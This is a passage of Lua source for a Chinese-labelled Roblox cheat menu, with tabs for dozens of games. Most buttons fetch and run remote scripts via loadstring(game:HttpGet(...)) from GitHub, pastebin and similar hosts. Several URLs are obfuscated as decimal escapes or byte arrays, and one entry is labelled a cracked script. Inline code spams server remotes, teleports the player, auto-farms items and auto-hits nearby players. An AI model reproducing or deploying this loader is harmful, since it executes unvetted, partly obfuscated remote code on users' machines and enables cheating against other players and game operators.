	Name = "2(需卡密)",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/nqxlOfc/Loaders/main/Blade_Ball.lua'))()
  	end
})

Tab:AddButton({
    Name= "3",
    Callback=function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/-beta-/main/AutoParry.lua"))()
    end
})

Tab:AddButton({
  Name = "4",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/HKLua/Balls/main/DawnLoader.lua"))()
  end
})

Tab:AddButton({
  Name = "5",
  Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Unknownkellymc1/Unknownscripts/main/slap-battles')))()
  end
})

Tab:AddButton({
  Name = "6",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/MagoKazinn/Makzinn_hub/main/makzinn_Hub"))()
  end
})

Tab:AddButton({
  Name = "7",
  Callback = function()
  loadstring(game:HttpGet("https://github.com/SadlekAski/Scripts/raw/main/Blade%20Ball/Equip%20any%20ability.lua"))()
  end
})

Tab:AddButton({
  Name = "8",
  Callback = function()
  getgenv().visualizer = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/RedCircleBlock"))()
  end
})

Tab:AddButton({
  Name = "9",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/SourceLua/main/Blade_Ball.lua"))()
  end
})

Tab:AddButton({
  Name = "10",
  Callback = function()
  loadstring(game:HttpGet('https://ayangwp.cn/api/v3/file/get/9047/%E5%88%80%E9%94%8B%E7%90%83.txt?sign=zhgdl7dk1C6Z-89qK1lEjIrmkso5Bih6f33sY5rCKJw%3D%3A0'))()
  end
})

Tab:AddButton({
  Name = "11",
  Callback = function()
  loadstring(game:HttpGet("https://paste.gg/p/anonymous/0425151104df470cb8203508e256b40a/files/aff63dcd12b04bfe8f6d9851eb6b2d3e/raw"))()
  end
})

Tab:AddButton({
  Name = "12",
  Callback = function()
  _G.UI_Size = 200 -- config ui size
loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/-beta-/main/AutoParry.lua"))()
  end
})

Tab:AddButton({
  Name = "自动格挡",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Parry%20V4.0.0",true))()
  end
})

Tab:AddButton({
  Name = "自动打",
  Callback = function()
  -- Red Circle Auto Block:
loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/autoparrybest"))()
-- Click 'X' to toggle spam mode, 'Z' for autoblock, and 'C' for the circle
  end
})

local player = Window:MakeTab({
	Name = "超级大力士",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

player:AddButton({ 
	Name = "1",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/Strongman'))()
  	end
})

local player = Window:MakeTab({
	Name = "幸运方块",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

player:AddButton({ 
	Name = "1",
	Callback = function()
      	loadstring(game:HttpGet("https://raw.githubusercontent.com/PlanetHubX/Lucky-Blocks/main/source", true))()
  	end
})

local Tab = Window:MakeTab({
	Name = "索尔的RNG",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "1",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Looser3itx/Hmmmmmmmmmmmmmmmmmmmmmmmmmmmm/main/loader.lua"))()
  	end
})

Tab:AddButton({
	Name = "hoho(需卡密)",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
  	end
})

Tab:AddButton({
	Name = "3(需卡密)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/upd/main/rng"))()
  	end
})

local Tab = Window:MakeTab({

	Name = "模仿者",

	Icon = "rbxassetid://7734068321",

	PremiumOnly = false

})

Tab:AddButton({

  Name = "1",

  Callback = function ()

loadstring(game:HttpGet("https://raw.githubusercontent.com/ttjy9808/THEMIMICNEWMOBILEUINOTBETA/main/README.md"))()

  end

})

local Tab = Window:MakeTab({
	Name = "内脏与黑火药",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "茗月清风",
	Callback = function()
loadstring(game:HttpGet(("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\115\120\99\115\114\49\49\52\53\49\52\47\115\120\99\115\114\49\49\52\53\49\52\49\47\109\97\105\110\47\115\120\99\115\114\49\51\52\56\52\56\52\56\56\46\108\117\97"),true))()
  	end
})

Tab:AddButton({
	Name = "2",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\34\104\116\116\112\115\58\47\47\102\114\101\101\110\111\116\101\46\98\105\122\47\114\97\119\47\109\117\122\110\104\101\114\104\114\117\34\41\44\116\114\117\101\41\41\40\41\10")()
  	end
})

local Tab = Window:MakeTab({
	Name = "河北唐县",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/s20nni0h/raw"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Tang%20Country.lua"))()
  end
})

local Tab = Window:MakeTab({
	Name = "死亡球",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Ball1/main/Death"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGet("https://github.com/Hosvile/InfiniX/releases/latest/download/main.lua",true))()
  end
})

local Tab = Window:MakeTab({
	Name = "杀手与警长",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/yadbPQUm",true))()
  end
})

local Tab = Window:MakeTab({
	Name = "51区",
	Icon = "rbxassetid://7733779610",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Saktk-In-Area51/main/Area51", true))()
  end
})

local Tab = Window:MakeTab({
	Name = "克隆大亨",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/HELLLO1073/RobloxStuff/main/CT-Destroyer"))()
  end
})

local Tab = Window:MakeTab({
	Name = "nico下一个机器人",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/elonof/nicosbots-script/main/main.lua",true))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/fartbutt69/Nico-s-Nextbot-Killer/main/script.lua", true))()
  end
})

local Tab = Window:MakeTab({
	Name = "小偷模拟器",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/adrician/Thief-Simulator---GUI/main/Thief%20sim.lua"),true))()
  end
})

local Tab = Window:MakeTab({
	Name = "怪兽宇宙",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/oRWEIEcJ/raw"))()
  end
})

local Tab = Window:MakeTab({
	Name = "汽车经销大亨",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/5o594Q0i/raw"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/03sAlt/BlueLockSeason2/main/README.md"))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IExpIoit/Script/main/Car%20Dealership%20Tycoon.lua"))()
  end
})

local Tab = Window:MakeTab({
	Name = "拳击模拟器",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/T4O1SA3q/raw"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Solx69/Shit-Boy-Hub-Main/main/Master.lua'))()
  end
})

local Tab = Window:MakeTab({
	Name = "恐怖奶奶",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/o688Jvmn/raw"))()
  end
})

local Tab = Window:MakeTab({
	Name = "旗帜战争",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Flag%20Wars.txt'))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/otEg6PJV/raw"))()
  end
})

local Tab = Window:MakeTab({
	Name = "起床战争",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Alan0947383/Demonic-HUB-V2/main/S-C-R-I-P-T.lua",true))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/Storm99999/Tenacity4Roblox/main/script.lua'))()
  end
})

Tab:AddButton({
  Name = "4",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/zLPdP1XQ"))()
  end
})

Tab:AddButton({
  Name = "透视秒拆自瞄",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/SlaveDash/Crokuranu/main/Bedwars%20UI%20Source%20Code'))()
  end
})

local Tab = Window:MakeTab({
	Name = "活过杀手",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Milan08Studio/ChairWare/main/main.lua"))()
  end
})

local Tab = Window:MakeTab({
    Name = "力量",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
    Name = "1",
    Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jynzl/main/main/Musclas%20Legenos.lua'))()
    end
})

Tab:AddButton({
  Name = "睡觉脚本破解版",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/iyoulin/IIIIllll/refs/heads/main/IlllIII"))()
  end
})

Tab:AddButton({
  Name = "神经力量传奇",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/Legend%20of%20Shenqing%20Power.lua"))()
  end
})

Tab:AddButton({
  Name = "Muscle Legends",
  Callback = function()
  loadstring(game:HttpGet("https://github.com/XiaoyeQWQ/Bs/raw/refs/heads/main/Legends.of.Power.by.Moxiaobai.KingAdvanced.txt.txt"))()
  end
})

local Section = Tab:AddSection({
	Name = "其他"
})

Tab:AddButton({
  Name = "收集宝石",
  Callback = function()
  jk = {} for _, v in pairs(game:GetService("ReplicatedStorage").chestRewards:GetDescendants()) do if v.Name ~= "Light Karma Chest" or v.Name ~= "Evil Karma Chest" then table.insert(jk, v.Name) end end for i = 1, #jk do wait(2) game:GetService("ReplicatedStorage").rEvents.checkChestRemote:InvokeServer(jk[i]) end
  end
})

local Section = Tab:AddSection({
	Name = "传送类"
})

Tab:AddButton({
	Name = "出生点",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7, 3, 108)
	end
})

Tab:AddButton({
	Name = "安全岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-39, 10, 1838)
	end
})

Tab:AddButton({
	Name = "肌肉之王健身房",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8554, 22, -5642)
	end
})

Tab:AddButton({
	Name = "传说健身房",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4676, 997, -3915)
	end
})

Tab:AddButton({
	Name = "永恒健身房",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6686, 13, -1284)
	end
})

Tab:AddButton({
	Name = "神话健身房",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2177, 13, 1070)
	end
})

Tab:AddButton({
	Name = "冰霜健身房",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2543, 13, -410)
	end
})

local Section = Tab:AddSection({
	Name = "自动类"
})

Tab:AddButton({
  Name = "自动重生",
  Callback = function()
  while ATRE do wait() game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest") end
  end
})

Tab:AddButton({
  Name = "自动比赛开关",
  Callback = function()
  while AR do wait() wait(2) game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl") end
  end
})

Tab:AddButton({
  Name = "自动倒立身体",
  Callback = function()
  local part = Instance.new('Part', workspace) part.Size = Vector3.new(500, 20, 530.1) part.Position = Vector3.new(0, 100000, 133.15) part.CanCollide = true part.Anchored = true local rs = game:GetService("RunService").RenderStepped while ATDL do wait() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 50, 0) for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do if v.ClassName == "Tool" and v.Name == "Handstands" then v.Parent = game.Players.LocalPlayer.Character end end end game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
  end
})

Tab:AddButton({
  Name = "自动仰卧起坐",
  Callback = function()
  local part = Instance.new('Part', workspace) part.Size = Vector3.new(500, 20, 530.1) part.Position = Vector3.new(0, 100000, 133.15) part.CanCollide = true part.Anchored = true local rs = game:GetService("RunService").RenderStepped while ATYWQZ do wait() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 50, 0) for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do if v.ClassName == "Tool" and v.Name == "Situps" then v.Parent = game.Players.LocalPlayer.Character end end end game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
  end
})

Tab:AddButton({
  Name = "自动俯卧撑",
  Callback = function()
  local part = Instance.new('Part', workspace) part.Size = Vector3.new(500, 20, 530.1) part.Position = Vector3.new(0, 100000, 133.15) part.CanCollide = true part.Anchored = true local rs = game:GetService("RunService").RenderStepped while ATFWC do wait() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 50, 0) for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do if v.ClassName == "Tool" and v.Name == "Pushups" then v.Parent = game.Players.LocalPlayer.Character end end game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep") end
  end
})

Tab:AddButton({
  Name = "自动举哑铃",
  Callback = function()
  local part = Instance.new('Part', workspace) part.Size = Vector3.new(500, 20, 530.1) part.Position = Vector3.new(0, 100000, 133.15) part.CanCollide = true part.Anchored = true local rs = game:GetService("RunService").RenderStepped while ATYL do wait() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 50, 0) for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do if v.ClassName == "Tool" and v.Name == "Weight" then v.Parent = game.Players.LocalPlayer.Character end end game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep") end
  end
})

Tab:AddButton({
  Name = "自动锻炼",
  Callback = function()
  local part = Instance.new('Part', workspace)
part.Size = Vector3.new(500, 20, 530.1)
part.Position = Vector3.new(0, 1000, 133.15)
part.CanCollide = true
part.Anchored = true

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 15, 0)

local a = true
local rs = game:GetService("RunService").RenderStepped
if a == true then
while rs:wait() do
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if v.ClassName == "Tool" and v.Name == "Weight" then
v.Parent = game.Players.LocalPlayer.Character
end
end
game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
end
end
  end
})

local Tab = Window:MakeTab({
    Name = "伐木大亨2",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,86,113,83,83,66,99,100,98})end)())))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/butter-hub/main/Butterhub.txt'))()
  end
})

Tab:AddButton({
  Name = "LuaWare",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/LuaWare.lua", true))()
  end
})

Tab:AddButton({
  Name = "Async",
  Callback = function()
  loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/KhayneGleave/Ancestor/main/Ancestor.lua'))()
  end
})

Tab:AddButton({
  Name = "butter",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/butter-hub/main/Butterhub.txt'))()
  end
})

Tab:AddButton({
  Name = "JJK刷钱脚本",
  Callback = function()
  loadstring(game:HttpGet'https://pastebin.com/raw/hnVtRcyb')()
  end
})

Tab:AddButton({
  Name = "白脚本不要钱",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/ScriptsDache/main/%E4%BC%90%E6%9C%A8%E5%A4%A7%E4%BA%A822.lua", true))()
  end
})

local Tab = Window:MakeTab({
    Name = "一次尘土飞扬的旅行",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://scriptblox.com/raw/a-dusty-trip-FREE-CAR-Gui-14352"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/ADustyTrip",true))()
  end
})

local Tab = Window:MakeTab({
    Name = "压力",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet(('https://github.com/DocYogurt/Main/raw/main/Scripts/Pressure')))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://github.com/Drop56796/CreepyEyeHub/blob/main/obfuscate.lua?raw=true"))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  getgenv().lishichuan="1001390385" loadstring(game:HttpGet("https://pastebin.com/raw/iZuasZCc"))()
  end
})

Tab:AddButton({
  Name = "万圣节脚本",
  Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\67\104\105\110\97\81\89\47\83\99\114\105\112\116\115\47\77\97\105\110\47\80\114\101\115\115\117\114\101"))()
  end
})

Tab:AddButton({
  Name = "明月清風",
  Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\101\116\122\106\110\78\83\75\78\83\47\67\52\66\57\45\51\51\67\50\65\45\49\67\49\66\48\45\53\52\48\72\86\45\83\71\54\71\56\47\109\97\105\110\47\80\114\111\116\101\99\116\101\100\95\54\50\56\49\54\56\54\49\54\48\57\52\51\49\48\51\48\53"))()
  end
})

local Tab = Window:MakeTab({
    Name = "巴掌模拟器",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Slap_Battles/main/Slap_Battles.lua"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://lkhub.net/s/loader.lua"))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/Unknownkellymc1/Unknownscripts/main/slap-battles')))()
  end
})

local Section = Tab:AddSection({
	Name = "其他"
})

Tab:AddButton({
  Name = "巴掌光环",
  Callback = function()
  getgenv().SlapAura = bool
            if bool == true then
                while getgenv().SlapAura do
                    task.wait(.005)
                        pcall(function()
                        for Index, Player in next, game.Players:GetPlayers() do
                            if Player ~= game.Players.LocalPlayer and Player.Character and Player.Character:FindFirstChild("entered") then
                                if Player.Character:FindFirstChild("Head") then
                                if Player.Character.Head:FindFirstChild("UnoReverseCard") == nil and Player.Character:FindFirstChild("rock") == nil then 
                                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                    local Magnitude = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
                                    if 25 >= Magnitude then
                                        shared.gloveHits[getGlove()]:FireServer(Player.Character:WaitForChild("Head"))
                                end
                                    end
                            end
                                end
                        end
                        end
                    end)
                end
            end
  end
})

Tab:AddButton({
  Name = "管理员手套",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Dusty1234567890/Ab-admin-glove-badge/main/Ab%20glovr%20badge%20admin"))()
  end
})

Tab:AddButton({
  Name = "巴掌刷手套脚本,要有一个手套",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/thanhdat4461/BaconScripterLua/main/BallerFarm.lua"))()
  end
})

Tab:AddButton({
  Name = "刷巴掌",
  Callback = function()
  loadstring(game:HttpGet("https://pastefy.app/hcG2LK3k/raw"))()
  end
})

Tab:AddButton({
  Name = "巴掌无敌",
  Callback = function()
  loadstring(game:HttpGet(("https://raw.githubusercontent.com/Donjosx/SlapBattle_Scripts/main/God_Mode_V2")))()
  end
})

Tab:AddButton({
  Name = "获取计数器手套",
  Callback = function()
  fireclickdetector(game.Workspace.CounterLever.ClickDetector)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,100,0)
wait(0.2)
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
wait(121)
for i,v in pairs(workspace.Maze:GetDescendants()) do
if v:IsA("ClickDetector") then
fireclickdetector(v)
end
end
  end
})

Tab:AddToggle({
	Name = "地牢亮度",
	Default = false,
	Callback = function(Value)

Light = Value
    if not Light then
        game.Lighting.Ambient = Color3.new(0, 0, 0)
    end
	end
})

Tab:AddToggle({
	Name = "彩虹角色(装黄金手套)",
	Default = false,
	Callback = function(Value)

_G.Rainbow = Value
while _G.Rainbow do
for i = 0,1,0.001*25 do
game:GetService("ReplicatedStorage").Goldify:FireServer(false, BrickColor.new(Color3.fromHSV(i,1,1)))
task.wait()
end
end
	end
})

Tab:AddToggle({
	Name = "无限反转",
	Default = false,
	Callback = function(Value)

_G.InfReverse = Value
while _G.InfReverse do
game:GetService("ReplicatedStorage").ReverseAbility:FireServer()
wait(6)
end
	end
})

Tab:AddToggle({
	Name = "Null技能",
	Default = false,
	Callback = function(Value)

NullSpam = Value
while NullSpam do
game:GetService("ReplicatedStorage").NullAbility:FireServer()
task.wait()
end
	end
})

Tab:AddToggle({
	Name = "音符技能",
	Default = false,
	Callback = function(Value)

_G.RhythmSpam = Value
while _G.RhythmSpam do
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
task.wait()
end
	end
})

Tab:AddToggle({
	Name = "复古技能",
	Default = false,
	Callback = function(Value)

RetroSpam = Value
while RetroSpam do
game:GetService("ReplicatedStorage").RetroAbility:FireServer(RetroAbility)
task.wait()
end
	end
})

local Section = Tab:AddSection({
	Name = "自动"
})

Tab:AddToggle({
	Name = "自动光波球",
	Default = false,
	Callback = function(Value)
if Person == nil then
Person = game.Players.LocalPlayer.Name
end
_G.RojoSpam = Value
while _G.RojoSpam do
game:GetService("ReplicatedStorage"):WaitForChild("RojoAbility"):FireServer("Release", {game.Players[Person].Character.HumanoidRootPart.CFrame})
task.wait()
end
	end
})

Tab:AddToggle({
	Name = "自动加入竞技场",
	Default = false,
	Callback = function(Value)
AutoEnterArena = Value
while AutoEnterArena do
if game.Players.LocalPlayer.Character:FindFirstChild("entered") == nil and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.Teleport1, 0)
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.Teleport1, 1)
    end
task.wait()
end
	end
})

Tab:AddToggle({
	Name = "自动刷bob",
	Default = false,
	Callback = function(Value)
ReplicaFarm = Value
while ReplicaFarm do
for i, v in pairs(workspace:GetChildren()) do
                if v.Name:match(game.Players.LocalPlayer.Name) and v:FindFirstChild("HumanoidRootPart") then
game.ReplicatedStorage.b:FireServer(v:WaitForChild("HumanoidRootPart"))
                end
            end
task.wait()
game:GetService("ReplicatedStorage").Duplicate:FireServer()
task.wait(7)
end
	end
})

Tab:AddToggle({
	Name = "自动捡相位球",
	Default = false,
	Callback = function(Value)
Phasefarm = Value
while Phasefarm do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "PhaseOrb" and v:FindFirstChild("TouchInterest") then
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), v, 0)
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), v, 1)
                    end
                end
task.wait()
end
	end
})

Tab:AddToggle({
	Name = "自动捡飞行宝珠",
	Default = false,
	Callback = function(Value)
Jetfarm = Value
while Jetfarm do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "JetOrb" and v:FindFirstChild("TouchInterest") then
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), v, 0)
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), v, 1)
                    end
                end
task.wait()
end
	end
})

Tab:AddToggle({
	Name = "自动拾取黄金果实",
	Default = false,
	Callback = function(Value)
SlappleFarm = Value
while SlappleFarm do
for i, v in ipairs(workspace.Arena.island5.Slapples:GetDescendants()) do
                if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:FindFirstChild("entered") and v.Name == "Glove" and v:FindFirstChildWhichIsA("TouchTransmitter") then
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v, 0)
        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v, 1)
                end
            end
task.wait()
end
	end
})

local Section = Tab:AddSection({
	Name = "反"
})

Tab:AddToggle({
	Name = "反Null",
	Default = false,
	Callback = function(Value)

AntiNull = Value
while AntiNull do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "Imp" and v:FindFirstChild("Body") then
shared.gloveHits[game.Players.LocalPlayer.leaderstats.Glove.Value]:FireServer(v.Body,true)
end
end
task.wait()
end
	end
})

Tab:AddToggle({
	Name = "反板砖",
	Default = false,
	Callback = function(Value)

AntiBrick = Value
while AntiBrick do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "Union" then
                        v.CanTouch = false
                    end
                end
task.wait()
end
	end
})

Tab:AddToggle({
	Name = "反上帝技能",
	Default = false,
	Callback = function(Value)

AntiTimestop = Value
while AntiTimestop do
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v.ClassName == "Part" then
                        v.Anchored = false
                    end
                end
task.wait()
end
	end
})

local Tab = Window:MakeTab({
    Name = "忍者传奇2",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/why-png/scriptstuffz/master/ninjaleg2", true))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/My-Dream-Hub/main/Ninja-Legends-2"))()
  end
})

local Tab = Window:MakeTab({
    Name = "内脏与黑火药",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://rawscripts.net/raw/Guts-andamp-Blackpowder-script-23420"))()
  end
})

Tab:AddButton({
  Name = "情云",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/GB"))()
  end
})

Tab:AddButton({
  Name = "清风1.1.1",
  Callback = function()
loadstring(game:HttpGet(("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\110\66\56\109\114\54\107\117"),true))()
  end
})

Tab:AddButton({
  Name = "测试版明月清风",
  Callback = function()
